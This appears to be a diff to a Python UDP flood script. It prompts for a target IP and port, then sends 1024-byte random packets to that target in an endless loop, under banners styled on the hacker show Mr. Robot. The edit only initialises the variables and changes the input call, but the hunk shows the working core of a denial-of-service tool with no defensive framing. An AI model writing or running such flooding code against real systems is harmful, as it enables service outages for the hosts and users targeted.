@@ -11,19 +11,21 @@ minute = now.minute
 day = now.day
 month = now.month
 year = now.year
-
+ip = 0
+port = 0
+sent = 0
+ 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1024)
 os.system("clear")
 print (R+"#FVCK 50C137Y")
 print (B+"#FR33D0M I5 4N I11U510N"+N)
 print
-ip = input("[$] TARGET IP: ")
+ip = raw_input("[$] TARGET IP: ")
 port = input("[$] PORT: ")
 os.system("clear")
 time.sleep(2)
 print()
-sent = 0
 while True:
 	sock.sendto(bytes, (ip,port))
 	sent = sent + 1
